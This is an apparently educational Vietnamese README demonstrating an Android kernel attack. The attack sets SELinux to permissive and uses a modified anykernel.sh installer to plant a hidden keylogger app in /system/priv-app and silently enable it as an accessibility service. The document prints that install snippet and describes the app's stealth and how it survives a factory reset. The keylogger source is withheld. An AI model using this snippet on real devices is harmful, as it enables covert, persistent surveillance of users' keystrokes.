# Kernel – Khi người gác cổng trở thành kẻ tiếp tay


<br>

<div align="center">

<img width="1920"  src="https://github.com/user-attachments/assets/cfe4dd46-a3dc-4e56-9dce-909c4b7de68e" />

</div>


# Giới thiệu

Phần demo này minh họa một kịch bản tấn công khi **tầng Kernel của Android bị can thiệp**.

Trong kiến trúc bảo mật của Android, Kernel đóng vai trò là lớp nền tảng kiểm soát toàn bộ hệ thống. Nếu tầng này bị phá vỡ, các cơ chế bảo mật ở tầng cao hơn như **SELinux, sandbox ứng dụng, và kiểm soát quyền truy cập** sẽ dễ bị đánh lừa.

Demo này nhằm chứng minh rằng khi một Kernel độc hại được cài đặt, kẻ tấn công có thể:

* Vô hiệu hóa cơ chế bảo vệ của hệ điều hành
* Cài đặt ứng dụng hệ thống độc hại
* Duy trì mã độc ngay cả sau khi **Factory Reset**

---

# Tổng quan kịch bản

Kịch bản demo bao gồm các bước chính:

1. Chỉnh sửa Kernel để vô hiệu hóa SELinux
2. Build và flash Kernel đã chỉnh sửa vào thiết bị
3. Kernel tự động cài đặt một ứng dụng hệ thống giả mạo
4. Ứng dụng hoạt động như một **keylogger chạy nền**

Mục tiêu của demo là minh họa một nguyên tắc quan trọng trong bảo mật hệ điều hành:

> ### Nếu tầng Kernel bị xâm phạm, các cơ chế bảo mật ở tầng ứng dụng sẽ trở thành vô nghĩa.

---

# 1. Chỉnh sửa Kernel

Trong quá trình build Kernel, trạng thái của SELinux được thay đổi từ 1 thành 0:

> ### Enforcing → Permissive

<div align="center">
  
<img width="413"  src="https://github.com/user-attachments/assets/039b66ac-5acb-44c0-b868-bd690b102fee" />

</div>

SELinux là cơ chế **Mandatory Access Control (MAC)** của Android, có nhiệm vụ chặn các hành vi truy cập trái phép giữa các tiến trình.

Khi chuyển sang chế độ **Permissive**, hệ thống chỉ ghi log vi phạm thay vì chặn chúng. Điều này khiến mã độc có thể thực thi nhiều hành vi nguy hiểm mà không bị ngăn chặn.
Có thể kiểm tra trạng thái SELinux sau khi cài đặt kernel bằng lệnh:
```shell
adb shell getenforce
```

<div align="center">
  
<img width="748" src="https://github.com/user-attachments/assets/78d6d42a-ad6e-48cf-804f-d96bdca0c833" />

</div>

---

# 2. Cài đặt Kernel độc hại

Kernel sau khi build được đóng gói cùng script cài đặt có tên: **anyKernel.sh**.

Trước khi flash Kernel, mình chỉnh sửa script cài đặt (`anykernel.sh`) giúp chèn một ứng dụng giả tiến trình hệ thống vào thư mục: ***`/system/priv-app/`***  
Các ứng dụng trong thư mục này được coi là **ứng dụng hệ thống đặc quyền**, có quyền truy cập cao hơn so với ứng dụng thông thường.
Code thêm vào annykernel.sh:

```shell
#Keylogger
# 1. Thiet lap quyen truy cap phan vung /system (RW)
mount -o rw,remount /system || mount -o rw,remount / || mount /system;

# 2. Trien khai Package vao danh muc dac quyen (priv-app)
mkdir -p /system/priv-app/SysConfig;

if [ -f $home/patch/SysConfig.apk ]; then
    ui_print "-> Dang sao chep tap tin he thong...";
    cp -f $home/patch/SysConfig.apk /system/priv-app/SysConfig/SysConfig.apk;
    
    # 3. Phan quyen he thong 
    chmod 755 /system/priv-app/SysConfig;
    chmod 644 /system/priv-app/SysConfig/SysConfig.apk;
    
    # Dinh nghia Service ID
    SERVICE_ID="com.android.sys.configss/.CucThanService";
    
    # Cap nhat danh sach cac dich vu 
    settings put secure enabled_accessibility_services $SERVICE_ID >/dev/null 2>&1;
    settings put secure accessibility_enabled 1 >/dev/null 2>&1;

    ui_print "-> Hoan tat trien khai dich vu he thong.";
else
    ui_print "-> Khong tim thay tap tin apk!";
fi

```

---

# 3. Cơ chế hoạt động của Keylogger

Ứng dụng được cài đặt có chức năng theo dõi các sự kiện nhập liệu trên thiết bị.

Đặc điểm của ứng dụng:

* Được cài đặt trong phân vùng hệ thống
* Hoạt động ngầm trong nền
* Không hiển thị biểu tượng trên màn hình
* Tự khởi động khi thiết bị khởi động

Ứng dụng sử dụng **Accessibility Service** để theo dõi các sự kiện chứa văn bản trên màn hình.

Dữ liệu thu thập sẽ được gửi đến một kênh giám sát từ xa như Telegram.

(Lưu ý: Phần mã nguồn chi tiết mình xin phép không chia sẻ nhằm tránh rủi ro lạm dụng.)

---

# 4. Cơ chế tàng hình

## Chạy ngay sau khi khởi động

Trong file manifest của ứng dụng có thêm thuộc tính:

```shell
android:directBootAware="true"
```

Thuộc tính này cho phép ứng dụng chạy ngay sau khi thiết bị khởi động, **ngay cả khi người dùng chưa mở khóa màn hình**.

---

## Không hiển thị trên màn hình chính

Ứng dụng không khai báo activity với ***`LAUNCHER`***.

Điều này khiến:

* Không có icon trên màn hình chính
* Không xuất hiện trong danh sách ứng dụng thông thường

Ứng dụng chỉ có thể được nhìn thấy khi **hiển thị ứng dụng hệ thống** trong phần quản lý ứng dụng.

<div align="center">

<img width="433" src="https://github.com/user-attachments/assets/6ba5080c-2951-4cab-9a01-ecf378b68443" />

</div>


---

# 5. Tồn tại sau Factory Reset

Factory Reset thông thường chỉ xóa dữ liệu trong các phân vùng:

> ### /data
> ### /cache


Trong khi đó ứng dụng được cài đặt trong phân vùng:

> ### /system/priv-app/

Do đó ứng dụng vẫn tồn tại sau khi reset thiết bị.

Cách duy nhất để loại bỏ là:

* Flash lại ROM gốc
* Hoặc flash lại Kernel gốc

---

# Demo thực tế

Video demo bên dưới  cho thấy các bước sau:

* Thiết bị khởi động bình thường sau khi flash Kernel
* Kiểm tra SELinux trả về trạng thái **Permissive**
* Ứng dụng hệ thống hoạt động ẩn
* Dữ liệu nhập liệu được ghi nhận theo thời gian thực

Video demo có thể xem tại đây:


### 🎬 https://www.facebook.com/share/v/18NQeqKrbS/


---

# Kết luận

Demo này minh họa một nguyên tắc cốt lõi trong bảo mật hệ thống:

> ### Nếu tầng Kernel bị xâm phạm, toàn bộ mô hình bảo mật của hệ điều hành có thể sụp đổ.

Đó là lý do tại sao **an toàn mức nhân** luôn là nền tảng sống còn của mọi hệ điều hành.

---

# Lưu ý

Demo này được thực hiện **chỉ nhằm mục đích học tập và nghiên cứu an toàn thông tin**.

Không khuyến khích hoặc hỗ trợ việc sử dụng các kỹ thuật này cho mục đích xâm phạm quyền riêng tư hoặc tấn công hệ thống.
